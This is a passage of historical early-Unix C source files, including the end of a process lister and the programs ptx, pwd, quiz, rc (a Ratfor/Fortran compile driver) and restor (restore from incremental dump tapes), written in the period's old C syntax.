				printf("%7o", proc[i].p_wchan); else
				printf("       ");
		}
		if (proc[i].p_stat==5)
			printf(" <defunct>");
		else
			prcom(i);
		printf("\n");
	}
	done();
}

getdev()
{
	register struct { int dir_ino; char dir_n[14]; } *p;
	register i, c;
	int f;
	char dbuf[512];
	int sbuf[20];

	f = open("/dev");
	if(f < 0) {
		printf("cannot open /dev\n");
		done();
	}
	swap = -1;
	c = 0;

loop:
	i = read(f, dbuf, 512);
	if(i <= 0) {
		close(f);
		if(swap < 0) {
			printf("no swap device\n");
			done();
		}
		ndev = c;
		return;
	}
	while(i < 512)
		dbuf[i++] = 0;
	for(p = dbuf; p < dbuf+512; p++) {
		if(p->dir_ino == 0)
			continue;
		if(p->dir_n[0] == 't' &&
		   p->dir_n[1] == 't' &&
		   p->dir_n[2] == 'y' &&
		   p->dir_n[4] == 0 &&
		   p->dir_n[3] != 0) {
			if(stat(p->dir_n, sbuf) < 0)
				continue;
			devc[c] = p->dir_n[3];
			devl[c] = sbuf->iaddr[0];
			c++;
			continue;
		}
		if(swap >= 0)
			continue;
		if(stat(p->dir_n, sbuf) < 0)
			continue;
		if((sbuf->iflags & 060000) != 060000)
			continue;
		if(sbuf->iaddr[0] == nl[1].value)
			swap = open(p->dir_n, 0);
	}
	goto loop;
}

setup(p, s)
char *p, *s;
{
	while (*p++ = *s++);
}

prcom(i)
{
	int baddr, laddr, mf;
	register int *ip;
	register char *cp, *cp1;
	int c, nbad;

	baddr = 0;
	laddr = 0;
	if (proc[i].p_flag&SLOAD) {
		laddr = proc[i].p_addr;
		mf = mem;
	} else {
		baddr = proc[i].p_addr;
		mf = swap;
	}
	laddr =+ proc[i].p_size - 8;
	baddr =+ laddr>>3;
	laddr = (laddr&07)<<6;
	seek(mf, baddr, 3);
	seek(mf, laddr, 1);
	if (read(mf, stbuf, 512) != 512)
		return(0);
	for (ip = &stbuf[256]; ip > &stbuf[0];) {
		if (*--ip == -1) {
			cp = ip+1;
			if (*cp==0)
				cp++;
			nbad = 0;
			for (cp1 = cp; cp1 < &stbuf[256]; cp1++) {
				c = *cp1;
				if (c==0)
					*cp1 = ' ';
				else if (c < ' ' || c > 0176) {
					if (++nbad >= 5) {
						*cp1++ = ' ';
						break;
					}
					*cp1 = '?';
				}
			}
			while (*--cp1==' ')
				*cp1 = 0;
			printf(lflg?" %.16s":" %.64s", cp);
			return(1);
		}
	}
	return(0);
}

done()
{

	fflush(obuf);
	exit();
}

putchar(c)
{

	putc(c, obuf);
}
-- /usr/source/s2/ptx.c mode=0100664 uid=3 gid=3 atime=174923465 mtime=169260599 --
/* permuted title index */

char	*tfil "/tmp/p.tmp";
char	*sw[] {
	"a",
	"an",
	"and",
	"as",
	"for",
	"is",
	"of",
	"on",
	"or",
	"the",
	"to",
	"up",
	0};
char	line[200];
int	ch;
int	ptflg;
int	llen	72;

main(argc, argv)
int argc;
char *argv[];
{
	extern fin, fout;
	extern onintr();
	int f;

	if(argc>1 && *argv[1]=='-') {
		llen = 100;
		ptflg++;
		argc--;
		argv++;
	}
	if(argc<2) {
		printf("arg count\n");
		exit();
	}
	fin = open(argv[1]);
	if(fin < 0) {
		printf("%s: cannot open\n", argv[1]);
		exit();
	}
	f = creat(tfil, 0600);
	if(f < 0) {
		printf("cannot create %s\n", tfil);
		exit();
	}
	fout = f;
	if ((signal(2, 1) & 01) ==0)
		signal(2, onintr);
	pass1();
	flush();
	close(fin);
	fin = 0;
	close(fout);
	fout = 1;
	f = fork();
	if(f < 0) {
		printf("try again\n");
		exit();
	}
	if(f == 0) {
		execl("/bin/sort", "sort", "-d", "-o", tfil, tfil, 0);
		execl("/usr/bin/sort", "sort", "-d", "-o", tfil, tfil, 0);
		printf("someone moved sort\n");
		exit();
	}
	while(wait() != f);
	fin = open(tfil, 0);
	if(fin < 0) {
		printf("cannot reopen %s\n", tfil);
		exit();
	}
	if (argc>=3)
		f = creat(argv[2], 0666);
	else
		f = dup(1);
	if(f < 0) {
		printf("%s: cannot open\n", argv[2]);
		exit();
	}
	fout = f;
	pass2();
	flush();
	onintr();
}

onintr()
{
	unlink(tfil);
	exit();
}

pass1()
{
	int n, c, i, ll, j, k, cc, ccc;

loop:
	if ((c=getchar())=='\0')
		return;
	n = 0;
	i = 0;
	while(c!='\n' && c!='\0') {
		if(c == '(')
			c = 0177;
		if(c==' ' || c=='\t') {
			i++;
			c = getchar();
			continue;
		}
		if(i) {
			i = 0;
			if(n<=llen) line[n++] = ' ';
		}
		if (n<=llen) line[n++] = c;
		c = getchar();
	}
	ll = n;
	line[n++] = 0;
	i = -1;
l1:
	while((cc=line[++i])==' ');
	n = i;
	j = 0;
	while(sw[j]) {
		i = n;
		k = 0;
		while ((cc=sw[j][k++])==line[i++]);
		if(cc==0 && ((ccc=line[--i])==' '||ccc==0))
			goto l1;
		j++;
	}
	i = n;
	while (c=line[n++]) putchar(c);
	putchar('~');
	n = 0;
	while (n<i) {
		c = line[n++];
		if (c!=' ' || n!=i)
			putchar(c);
	}
	putchar('\n');
	while((c=line[i++])!=0 && c!=' ');
	--i;
	if (c) goto l1;
	goto loop;
}

pass2()
{
	int i, n, c, tilde, llen2, nbfore, nafter;


	llen2 = llen/2+6;
loop:
	if ((c=getchar())=='\0')
		return;
	n = nbfore = nafter = 0;
	tilde = -1;
	while(c!='\n' && c!='\0') {
		if(c == 0177)
			c = '(';
		if (n<=llen) line[n] = c;
		if (c=='~') tilde = n;
		if (tilde>=0) nafter++; else nbfore++;
		n++;
		c = getchar();
	}
	if (tilde<0)
		tilde = n++;
	nafter--;
	if (nbfore>llen2) {
		i = tilde;
		while (nbfore > llen2)
			while(line[--i]!=' ' && i>=0) nbfore--;
		if (i<0) goto l1;
		line[tilde] = 0200;
		nafter =+ (tilde-i+2);
		tilde = i;
	}
	if (nafter >= llen-llen2) {
		i = tilde;
		while(nafter-- >= llen-llen2)
			while(line[++i]!=' ' && i<n) nafter--;
		if (i>=n) goto l1;
		line[tilde] = 0200;
		nafter++;
		tilde = i;
	}
l1:
	if(!ptflg) {
		for(i=llen-llen2-nafter; i>=8; i =- 8)
			putchar('\t');
		while(--i>=0)
			putchar(' ');
	} else
		printf(".xx \"");
	i = tilde;
	while (++i<n) p1char(line[i]);
	if(!ptflg)
		printf("  "); else
		printf("\" \"");
	i = -1;
	while(++i<tilde) p1char(line[i]);
	if(ptflg)
		putchar('"');
	putchar('\n');
	goto loop;
}

p1char(c)
{
	if ((c&0377) == 0200) {
		putchar('.');
		putchar('.');
		c = '.';
	}
	putchar(c);
}
-- /usr/source/s2/pwd.c mode=0100664 uid=3 gid=3 atime=174923481 mtime=169260599 --
char dot[] ".";
char dotdot[] "..";
char root[] "/";
char name[512];
int file, off -1;
struct statb {int devn, inum, i[18];}x;
struct entry { int jnum; char name[16];}y;

main() {
	int n;

loop0:
	stat(dot, &x);
	if((file = open(dotdot,0)) < 0) prname();
loop1:
	if((n = read(file,&y,16)) < 16) prname();
	if(y.jnum != x.inum)goto loop1;
	close(file);
	if(y.jnum == 1) ckroot();
	cat();
	chdir(dotdot);
	goto loop0;
}
ckroot() {
	int i, n;

	if((n = stat(y.name,&x)) < 0) prname();
	i = x.devn;
	if((n = chdir(root)) < 0) prname();
	if((file = open(root,0)) < 0) prname();
loop:
	if((n = read(file,&y,16)) < 16) prname();
	if(y.jnum == 0) goto loop;
	if((n = stat(y.name,&x)) < 0) prname();
	if(x.devn != i) goto loop;
	x.i[0] =& 060000;
	if(x.i[0] != 040000) goto loop;
	if(y.name[0]=='.')if(((y.name[1]=='.') && (y.name[2]==0)) ||
				(y.name[1] == 0)) goto pr;
	cat();
pr:
	write(1,root,1);
	prname();
}
prname() {
	if(off<0)off=0;
	name[off] = '\n';
	write(1,name,off+1);
	exit();
}
cat() {
	int i, j;

	i = -1;
	while(y.name[++i] != 0);
	if((off+i+2) > 511) prname();
	for(j=off+1; j>=0; --j) name[j+i+1] = name[j];
	off=i+off+1;
	name[i] = root[0];
	for(--i; i>=0; --i) name[i] = y.name[i];
}
-- /usr/source/s2/quiz.c mode=0110664 uid=3 gid=3 atime=174923492 mtime=169260599 --
#define NF 10
#define NL 200
#define NC 200
#define SL 100
#define NA 10

int tflag;
int xx[NL];
char score[NL];
int rights;
int wrongs;
int guesses;
int buf[259];
int nl 0;
int na NA;
int inc;
int ptr 0;
int nc 0;
char line[150];
char response[100];
char *tmp[NF];
int select[NF];

readline()
{
	char *t;
loop:
	for(t=line;(*t=getc(buf))!=-1;t++) {
		nc++;
		if(*t==' '&&(t==line||t[-1]==' '))
			t--;
		if(*t=='\n') {
			if(t[-1]=='\\')		/*inexact test*/
				continue;
			while(t>line&&t[-1]==' ')
				*--t = '\n';
			*++t = 0;
			return(1);
		}
		if(t-line>=NC) {
			printf("Too hard for me\n");
			do {
				*line = getc(buf);
				if(*line==0377)
					return(0);
			} while(*line!='\n');
			goto loop;
		}
	}
	return(0);
}

char *eu;
char *ev;
cmp(u,v)
{
	int x;
	eu = u;
	ev = v;
	x = disj(1);
	if(x!=1)
		return(x);
	return(eat(1,0));
}

disj(s)
{
	int t, x;
	char *u;
	u = eu;
	t = 0;
	for(;;) {
		x = string(s);
		if(x>1)
			return(x);
		switch(*ev) {
		case 0:
		case ']':
		case '}':
			return(t|x&s);
		case '|':
			ev++;
			t =| s;
			s = 0;
			continue;
		}
		if(s) eu = u;
		if(string(0)>1)
			return(2);
		switch(*ev) {
		case 0:
		case ']':
			return(0);
		case '}':
			return(1);
		case '|':
			ev++;
			continue;
		default:
			return(2);
		}
	}
}

string(s)
{
	int x;
	for(;;) {
		switch(*ev) {
		case 0:
		case '|':
		case ']':
		case '}':
			return(1);
		case '\\':
			ev++;
			if(*ev==0)
				return(2);
			if(*ev=='\n') {
				ev++;
				continue;
			}
		default:
			if(eat(s,*ev)==1)
				continue;
			return(0);
		case '[':
			ev++;
			x = disj(s);
			if(*ev!=']' || x>1)
				return(2);
			ev++;
			if(s==0)
				continue;
			if(x==0)
				return(0);
			continue;
		case '{':
			ev++;
			x = disj(s);
			if(*ev!='}'||x>1)
				return(2);
			ev++;
			continue;
		}
	}
}

eat(s,c)
char c;
{
	if(*ev!=c)
		return(2);
	if(s==0) {
		ev++;
		return(1);
	}
	if(fold(*eu)!=fold(c))
		return(0);
	eu++;
	ev++;
	return(1);
}

fold(c)
char c;
{
	if(c<'A'||c>'Z')
		return(c);
	return(c|040);
}

publish(t)
char *t;
{
	ev = t;
	pub1(1);
}

pub1(s)
{
	for(;;ev++){
		switch(*ev) {
		case '|':
			s = 0;
			ev;
			continue;
		case ']':
		case '}':
		case 0:
			return;
		case '[':
		case '{':
			ev++;
			pub1(s);
			ev;
			continue;
		case '\\':
			if(*++ev=='\n')
				continue;
		default:
			if(s)
				putchar(*ev);
		}
	}
}

segment(u,w)
char *u, *w[];
{
	char *s;
	int i;
	char *t;
	s = u;
	for(i=0;i<NF;i++) {
		u = s;
		t = w[i];
		while(*s!=':'&&*s!='\n'&&s-u<SL) {
			if(*s=='\\')  {
				if(s[1] == '\n') {
					s =+ 2;
					continue;
				}
				*t++ = *s++;
			}
			*t++ = *s++;
		}

		while(*s!=':'&&*s!='\n')
			s++;
		*t = 0;
		if(*s++=='\n') {
			return(i+1);
		}
	}
	printf("Too many facts about one thing\n");
}

perm(u,m,v,n,p)
int p[];
char *u[], *v[];
{
	int i, j;
	int x;
	for(i=0;i<m;i++) {
		for(j=0;j<n;j++) {
			x = cmp(u[i],v[j]);
			if(x>1) badinfo();
			if(x==0)
				continue;
			p[i] = j;
			goto uloop;
		}
		return(0);
uloop:		;
	}
	return(1);
}

find(u,m)
char *u[];
{
	int n;
	while(readline()){
		n = segment(line,tmp);
		if(perm(u,m,tmp+1,n-1,select))
			return(1);
	}
	return(0);
}

readindex()
{
	xx[0] = nc = 0;
	while(readline()) {
		xx[++nl] = nc;
		if(nl>=NL) {
			printf("I've forgotten some of it\n");
			break;
		}
	}
}

talloc()
{
	int i;
	for(i=0;i<NF;i++)
		tmp[i] = alloc(SL);
}

main(argc,argv)
char *argv[];
{
	int i;
	int x;
	char *info;
	int tvec[2];
	char *t;
	extern done();
	int count;
	info = "/usr/lib/quiz/index";
	time(tvec);
	inc = tvec[1]&077774|01;
loop:
	if(argc>1&&*argv[1]=='-') {
		switch(argv[1][1]) {
		case 'i':
			if(argc>2) 
				info = argv[2];
			argc =- 2;
			argv =+ 2;
			goto loop;
		case 't':
			tflag = 1;
			argc--;
			argv++;
			goto loop;
		}
	}
	if(fopen(info,buf)== -1) {
		printf("No info\n");
		exit();
	}
	talloc();
	if(argc<=2)
		instruct(info);
	signal(2,done);
	argv[argc] = 0;
	if(find(&argv[1],argc-1)==0)
		dunno();
	close(buf[0]);
	if(fopen(tmp[0],buf)== -1) 
		dunno();
	readindex();
	if(!tflag || na>nl)
		na = nl;
	for(;;) {
		i = next();
		seek(buf[0],xx[i],0);
		read(buf[0],line,xx[i+1]-xx[i]);
		segment(line,tmp);
		if(*tmp[select[0]] == '\0' || *tmp[select[1]] == '\0') {
			score[i] = 1;
			continue;
		}
		publish(tmp[select[0]]);
		printf("\n");
		for(count=0;;count++) {
			if(query(response)==0) {
				publish(tmp[select[1]]);
				printf("\n");
				if(count==0) wrongs++;
				score[i] = tflag?-1:1;
				break;
			}
			x = cmp(response,tmp[select[1]]);
			if(x>1) badinfo();
			if(x==1) {
				printf("Right!\n");
				if(count==0) rights++;
				if(++score[i]>=1 && na<nl)
					na++;
				break;
			}
			printf("What?\n");
			if(count==0) wrongs++;
			score[i] = tflag?-1:1;
		}
		guesses =+ count;
	}
}

query(r)
char *r;
{
	char *t;
	for(t=r;;t++) {
		if(read(0,t,1)==0)
			done();
		if(*t==' '&&(t==r||t[-1]==' '))
			t--;
		if(*t=='\n') {
			while(t>r&&t[-1]==' ')
				*--t = '\n';
			break;
		}
	}
	*t = 0;
	return(t-r);
}

next()
{
	int flag;
	inc = inc*3125&077777;
	ptr = (inc>>2)%na;
	flag = 0;
	while(score[ptr]>0)
		if(++ptr>=na) {
			ptr = 0;
			if(flag) done();
			flag = 1;
		}
	return(ptr);
}

done()
{
	printf("\nRights %d, wrongs %d, ", rights, wrongs);
	if(guesses)
		printf("extra guesses %d, ", guesses);
	printf("score %d%%\n",100*rights/(rights+wrongs));
	exit();
}
instruct(info)
{
	char *t;
	int i, n;
	printf("Subjects:\n\n");
	while(readline()) {
		printf("-");
		n = segment(line,tmp);
		for(i=1;i<n;i++) {
			printf(" ");
			publish(tmp[i]);
		}
		printf("\n");
	}
	printf("\n");
	if(fopen(info,buf)== -1)
		abort();
	readline();
	segment(line,tmp);
	printf("For example,\n");
	printf("    quiz ");
	publish(tmp[1]);
	printf(" ");
	publish(tmp[2]);
	printf("\nasks you a ");
	publish(tmp[1]);
	printf(" and you answer the ");
	publish(tmp[2]);
	printf("\n    quiz ");
	publish(tmp[2]);
	printf(" ");
	publish(tmp[1]);
	printf("\nworks the other way around\n");
	printf("\nType empty line to get correct answer.\n");
	exit();
}

badinfo(){
	printf("Bad info %s\n",line);
}

dunno()
{
	printf("I don't know about that\n");
	exit();
}
-- /usr/source/s2/rc.c mode=0110664 uid=3 gid=3 atime=174923516 mtime=169260599 --
/* Ratfor-Fortran command */

extern int fin, fout;
char	ts[1000];
char	*tsp	ts;
char	*av[50];
char	*rlist[50];
int	nr	0;
char	*llist[50];
int	nl	0;
int	nxo	0;
int	bdcount	0;	/* count block data files generated */
int	rflag;
int	dflag	0;
int	vflag	1;
int	fflag;
int	cflag;
char	*complr "/usr/fort/fc1";
char	*ratfor "/usr/lib/ratfor";

main(argc, argv)
char *argv[]; {
	char *t;
	int i, j, c;
	int dexit();

	for(i=0; ++i < argc; ) {
		if(*argv[i] == '-')
			switch (argv[i][1]) {
				default:
					goto passa;
				case 'd':
					dflag = 1;
					break;
				case 'v':
					vflag = 0;
					break;
				case 'r':
					rflag = fflag = cflag = 1;
					break;
				case 'f':
					fflag = 1;
					break;
				case 'c':
					cflag = 1;
					break;
				case '2':
					complr = "/usr/fort/fc2";
					break;
			}
		else {
	   passa:
			t = argv[i];
			if( (c=getsuf(t))=='r' )
				ratcomp(t);
			else if( c=='f')  {
				fortcomp(t);
				llenter(setsuf(copy(t),'o'));
			}
			else
				llenter(copy(t));
		}
	}
	if(rflag)
		dexit();
	if ((signal(2, 1) & 01) == 0)
		signal(2, &dexit);
	if(dflag)
		printf("cflag=%d, nl=%d\n", cflag, nl);
	if (cflag==0 && nl!=0) {
		i = 0;
		av[0] = "ld";
		av[1] = "-x";
		av[2] = "/lib/fr0.o";
		j = 3;
		while(i<nl)
			av[j++] = llist[i++];
		av[j++] = "-lf";
		av[j++] = "/lib/filib.a";
		av[j++] = "-l";
		av[j++] = 0;
		callsys("/bin/ld", av);
	}
	dexit();
}

dexit()
{
	int i;
	cunlink("ratjunk");
	cunlink("f.tmp1");
	exit(0);
}


ratcomp(s) char *s; {
	int i,j,t,nerr,status;
	nr = 0;
	if(vflag)
		printf("%s:\n",s);
	av[0] = ratfor;
	av[1] = s;
	av[2] = 0;
	if( (t=fork())==0 ){
		close(1);
		fout = creat("ratjunk", 0666);
		execv(ratfor, av);
		fout = 2;
		error("can't ratfor\n");
		exit(1);
	}
	while( t!=wait(&status) );
	if( (t=(status&0377)) != 0 && t!=14 )
		dexit(1);
	t = (status>>8) & 0377;
	if( t )
		return(++cflag);
	splitup();
	nerr=0;
	for(i=0; i<nr; i++){
		if( vflag ) printf("   ");
		if( fortcomp(rlist[i]) )
			nerr++;
	}
	if( nerr )
		return(1);
	av[0] = "ld";
	av[1] = "-r";
	av[2] = "-x";
	j = 3;
	for(i=0; i<nr; i++)
		av[j++] = rlist[i];
	av[j] = 0;
	callsys("/bin/ld", av);
	t = setsuf(copy(s),'o');
	if( move("a.out", t) )
		cflag++;
	llenter(t);
	for(i=0; i<nr; i++) {
		if( nodup(llist,rlist[i]) )
			cunlink(rlist[i]);
		if( fflag==0 )
			cunlink(setsuf(rlist[i],'f'));
	}
}

fortcomp(s) char *s; {
	int t;
	if( vflag ) printf("%s:\n", s);
	av[0] = complr;
	av[1] = s;
	av[2] = 0;
	if( callsys(complr, av) )
		return(++cflag);
	av[0] = "as";
	av[1] = "-";
	av[2] = "f.tmp1";
	av[3] = 0;
	callsys("/bin/as", av);
	t = setsuf(s, 'o');
	if( move("a.out", t) )
		return(++cflag);
	return(0);
}

getsuf(s)
char s[];
{
	int c;
	char t, *os;

	c = 0;
	os = s;
	while(t = *s++)
		if (t=='/')
			c = 0;
		else
			c++;
	s =- 3;
	if (c<=14 && c>2 && *s++=='.')
		return(*s);
	return(0);
}

setsuf(s, ch)
char s[];
{
	char *os;

	os = s;
	while(*s++);
	s[-2] = ch;
	return(os);
}

move(s,t) char *s, *t; {
	cunlink(t);
	if(link(s, t) || cunlink(s)) {
		printf("move failed: %s\n", t);
		return(1);
	}
	return(0);
}

callsys(f, v)
char f[], *v[]; {
	int i, t, status;

	if(dflag){
		for(i=0; v[i]; i++)
			printf("%s ", v[i]);
		putchar('\n');
	}
	if ((t=fork())==0) {
		execv(f, v);
		printf("Can't find %s\n", f);
		exit(1);
	} else
		if (t == -1) {
			printf("Try again\n");
			return(1);
		}
	while(t!=wait(&status));
	if ((t=(status&0377)) != 0 && t!=14) {
		if (t!=2)		/* interrupt */
			printf("Fatal error in %s\n", f);
		dexit();
	}
	t = (status>>8) & 0377;
	if(dflag && status != 0)
		printf("status = %d\n", t);
	return(t);
}

copy(s)
char s[]; {
	char *otsp;

	otsp = tsp;
	while(*tsp++ = *s++);
	return(otsp);
}

nodup(l, s)
char **l, s[]; {
	char *t, *os, c;

	if (getsuf(s) != 'o')
		return(1);
	os = s;
	while(t = *l++) {
		s = os;
		while(c = *s++)
			if (c != *t++)
				break;
		if (*t++ == '\0')
			return(0);
	}
	return(1);
}

llenter(t) char *t; {
	if (nodup(llist, t)) {
		llist[nl++] = t;
		if (getsuf(t)=='o')
			nxo++;
	}
}

cunlink(f)
char *f;
{
	if( dflag )
		printf("unlink %s\n", f);
	if (f==0)
		return(0);
	return(unlink(f));
}

splitup(){
	char in[200], fname[20];
	int buf[259];
	int i,fd,c;
	if( (fin=open("ratjunk", 0)) < 0)
		error("can't open ratjunk\n");
	while( gets(in) ){
		getname(in, fname);
		savename(fname);
		if( (fd = fcreat(fname, buf)) < 0)
			error("can't open %s", fname);
		puts(in,buf);
		while( ! endcard(in) ){
			gets(in);
			puts(in,buf);
		}
		fflush(buf);
		close(fd);
	}
	close(fin);
}

gets(s) char *s; {
	int c;
	while( (*s++=c=getchar()) != '\n' && c != '\0' );
	*s = '\0';
	return(c);
}

puts(s,b) char *s; int *b; {
	while( *s )
		putc(*s++, b);
}

savename(s) char *s; {
	rlist[nr++] = copy(s);
}

getname(s,f) char *s,*f; {
	int i,j,c;
   loop:
	while( *s == ' ' || *s == '\t' )
		s++;
	if( compar(s,"subroutine") ){ s =+ 10; goto bot; }
	else if( compar( s,"function") ){ s =+ 8; goto bot; }
	else if( compar(s,"real") ){ s =+ 4; goto loop; }
	else if( compar(s,"integer") ){ s =+ 7; goto loop; }
	else if( compar(s,"logical") ){ s =+ 7; goto loop; }
	else if( compar(s,"double") ){ s =+ 6; goto loop; }
	else if( compar(s,"precision") ){ s =+ 9; goto loop; }
	else if( compar(s,"complex") ){ s =+ 7; goto loop; }
	else if( compar(s,"block") ){
		s = "blockdata ";
		s[9] = (bdcount++) + '0';
		goto bot;
	}
	else {
		for(i=0; f[i]="MAIN.f"[i]; i++);
		return;
	}
   bot:
	while( *s == ' ' || *s == '\t' )
		s++;
	for(i=0; alphanum(s[i]); i++)
		f[i] = s[i];
	f[i++] = '.';
	f[i++] = 'f';
	f[i++] = '\0';
}

compar(s,t) char *s,*t; {
	while( *t )
		if( *s++ != *t++ )
			return(0);
	return(1);
}

alphanum(c) int c; {
	return( (c>='a' && c<='z')
		|| (c>='A' && c<='Z')
		|| (c>='0' && c<='9') );
}

endcard(s) char *s; {
	if( *s==0 )
		return(1);
	while( *s==' ' || *s=='\t' )
		s++;
	if( *s!='e' || *(s+1)!='n' || *(s+2)!='d' || *(s+3)!='\n' )
		return(0);
	return(1);
}

error(s1, s2){
	fout = 1;
	printf(s1,s2);
	putchar('\n');
	flush(1);
	cflag++;
}
-- /usr/source/s2/restor.c mode=0110664 uid=3 gid=3 atime=174923537 mtime=169260599 --
#

/*
 * restore from incremental dumps
 */

char	*dargv[]
{
	0,
	"t",
	0
};
char	*ifile;
char	*ofile;
#include "/usr/sys/ino.h"
#include "/usr/sys/filsys.h"

struct	filsys	sblock;
int	isize;
int	*talist;
int	fi;
int	buf[256];
int	dbuf[256];
int	cbuf[256];
char	*date[2];
char	*ddate[2];
int	fo;
int	pher;
char	*tsize	15000;
int	iflg;
int	wflg;
int	cflg;
char	file[10];
int	ilist[100];

main(argc, argv)
char **argv;
{
	char *key;
	register *tap, *p;
	register struct inode *ip;
	int i, com, sz, *q, l;

	ifile = "/dev/mt0";
	if(argc == 1) {
		argv = dargv;
		for(argc = 1; dargv[argc]; argc++);
	}

	argc--;
	argv++;
	key = *argv;
	while(*key)
	switch(*key++) {
	default:
		printf("bad character in key\n");
		exit();

	case 't':
	case 'r':
	case 'x':
		com = key[-1];
		continue;

	case 'i':
		iflg++;
		continue;

	case '-':
		continue;

	case 'c':
		cflg++;
		continue;

	case 'f':
		argv++;
		argc--;
		ifile = *argv;
		continue;

	case 'w':
		wflg++;
		continue;

	}
	otape();
	sread(buf, 0);
	tap = buf;
	isize = *tap++;
	*tap++;		/* fsize */
	date[0] = *tap++;
	date[1] = *tap++;
	ddate[0] = *tap++;
	ddate[1] = *tap++;
	tsize = *tap++;
	i = size(0, isize*32);
	talist = sbrk(i*512);
	tap = talist;
	while(i--) {
		tread(tap, 0);
		tap =+ 256;
	}
	switch(com) {

case 't':
	l = 0;
	com = 0;
	pdate(ddate);
	pdate(date);
	tap = talist;
	for(i=0; i<isize*16; i++) {
		sz = *tap++;
		if(sz == 0 || sz == -1) {
			if(com == 0)
				continue;
			if(i == com) {
				printf("%l", i);
				l =+ 5;
			} else {
				printf("%l-%l", com, i);
				l =+ 10;
			}
			if(l > 60) {
				printf("\n");
				l = 0;
			} else
				printf(",");
			com = 0;
		} else
		if(com == 0)
			com = i+1;
	}
	if(com)
		printf("%l-\n", com);
	printf("\n");
	exit();

case 'r':
	if(argc <= 1) {
		printf("no filesystem name\n");
		exit();
	}
	ofile = argv[1];
	fo = open(ofile, 2);
	if(fo < 0) {
		printf("can not open %s\n", ofile);
		exit();
	}
	printf("last chance before scribbling on %s\n", ofile);
	getchar();
	dread(1, &sblock);
	tap = talist;
	for(i=0; i<sblock.s_isize; i++) {
		if(i >= isize)
			break;
		dread(i+2, buf);
		for(ip = &buf[0]; ip < &buf[256]; ip++) {
			sz = *tap++;
			if(sz == 0)
				continue;
			dealoc(ip);
			if(sz == -1) {
				for(p = ip; p < &ip->i_mtime[2]; )
					*p++ = 0;
				continue;
			}
			sread(dbuf, 0);
			q = dbuf;
			for(p = ip; p < &ip->i_mtime[2]; )
				*p++ = *q++;
			restor(ip, sz-1);
		}
		dwrite(i+2, buf);
	}
	dwrite(1, &sblock);
	com = 0;
	for(; i < isize; i++)
		for(l = 0; l < 16; l++) {
			sz = *tap++;
			if(sz != 0 && sz != -1)
				com++;
		}
	if(com)
		printf("%l files not restored - small ilist\n", com);
	exit();

case 'x':
	i = 0;
	tap = ilist;
	while(argc > 1) {
		i++;
		sz = number(argv[1]);
		argv++;
		argc--;
		if(sz <= 0 || sz >=isize*16) {
			printf("%l not in range\n", sz);
			continue;
		}
		if(talist[sz-1] == 0) {
			printf("%l not dumped\n", sz);
			continue;
		}
		if(talist[sz-1] == -1) {
			printf("%l does not exist\n", sz);
			continue;
		}
		*tap++ = sz;
	}
	if(i != 0 && ilist[0] == 0)
		exit();
	tap = talist;
	for(i=1; i<=isize*16; i++) {
		if(ilist[0] != 0) {
			for(sz=0; ilist[sz]; sz++)
				if(ilist[sz] == i)
					goto yes;
			sz = *tap++;
		no:
			if(sz == -1)
				sz = 0;
			while(sz--)
				tread(dbuf, 1);
			continue;
		}
	yes:
		sz = *tap++;
		if(sz == 0 || sz == -1)
			continue;
		fo = dwait(i);
		if(fo < 0)
			goto no;
		sz--;
		sread(buf, 0);
		ip = buf;
		while(sz--) {
			tread(dbuf, 0);
			com = 512;
			if(ip->i_size0 == 0 && ip->i_size1 < 512)
				com = ip->i_size1;
			write(fo, dbuf, com);
			if(com > ip->i_size1)
				ip->i_size0--;
			ip->i_size1 =- com;
		}
		close(fo);
		chmod(file, ip->i_mode);
		chown(file, ip->i_uid);
	}
	exit();

	}
}

dealoc(p)
struct inode *p;
{
	register struct inode *ip;
	register i, j;
	int k;
	int xbuf[256], ybuf[256];

	ip = p;
	if(ip->i_mode & (IFCHR&IFBLK))
		return;
	for(i=7; i>=0; i--)
	if(ip->i_addr[i]) {
		if(ip->i_mode&ILARG) {
			dread(ip->i_addr[i], xbuf);
			for(j=255; j>=0; j--)
			if(xbuf[j]) {
				if(i == 7) {
					dread(xbuf[j], ybuf);
					for(k=255; k>=0; k--)
					if(ybuf[k])
						free(ybuf[k]);
				}
				free(xbuf[j]);
			}
		}
		free(ip->i_addr[i]);
	}
}

restor(p, sz)
struct inode *p;
{
	register struct inode *ip;
	register i, j;
	int xbuf[256];

	ip = p;
	if(ip->i_mode & (IFCHR&IFBLK))
		return;
	for(i=0; i<8; i++)
		ip->i_addr[i] = 0;
	if(sz <= 8) {
		for(i=0; i<sz; i++)
			ip->i_addr[i] = rcop();
		ip->i_mode =& ~ILARG;
		return;
	}
	for(i=0; i<256; i++)
		xbuf[i] = 0;
	for(j=0; sz >= 256; j++) {
		if(j <= 7)
			ip->i_addr[j] = alloc();
		if(j >= 7)
			xbuf[j-7] = alloc();
		for(i=0; i<256; i++)
			dbuf[i] = rcop();
		if(j < 7)
			dwrite(ip->i_addr[j], dbuf); else
			dwrite(xbuf[j-7], dbuf);
		sz =- 256;
	}
	if(sz) {
		if(j <= 7)
			ip->i_addr[j] = alloc();
		if(j >= 7)
			xbuf[j-7] = alloc();
		for(i=0; i<sz; i++)
			dbuf[i] = rcop();
		for(; i<256; i++)
			dbuf[i] = 0;
		if(j < 7)
			dwrite(ip->i_addr[j], dbuf); else
			dwrite(xbuf[j-7], dbuf);
	}
	if(j >= 7)
		dwrite(ip->i_addr[7], xbuf);
	ip->i_mode =| ILARG;
}

rcop()
{
	register b;

	b = alloc();
	tread(cbuf, 0);
	dwrite(b, cbuf);
	return(b);
}

pdate(d)
int *d;
{

	if(d[0] == 0 && d[1] == 0)
		printf("the epoch\n"); else
		printf(ctime(d));
}

dread(bno, b)
{

	seek(fo, bno, 3);
	if(read(fo, b, 512) != 512) {
		printf("disk read error %l\n", bno);
		exit();
	}
}

dwrite(bno, b)
{

	seek(fo, bno, 3);
	if(write(fo, b, 512) != 512) {
		printf("disk write error %l\n", bno);
		exit();
	}
}

sread(b, flag)
int *b;
{
	register i, s, *p;

	tread(b, flag);
	if(flag)
		return;
	i = 256;
	s = 0;
	p = b;
	while(i--)
		s =+ *p++;
	if(s != 031415) {
		printf("checksum error\n");
		if(!iflg)
			exit();
	}
}

tread(b, flag)
int *b;
{
	register c;
	static char *pta, *ata, ctflg;

	if(pta++ >= tsize) {
		pta = 1;
		ata = 0;
		close(fi);
		otape();
		ctflg++;
	}
	if(flag)
		return;
	if(ctflg) {
		printf("change tapes\n");
		if(ctflg > 1)
			printf("skip %d tapes\n", ctflg-1);
		while((c = getchar()) != '\n')
			if(c == 0)
				exit();
		ctflg = 0;
	}
	ata++;
	if(iflg)
	for(; pta != ata; ata++)
		read(fi, b, 512);
	if(pta != ata) {
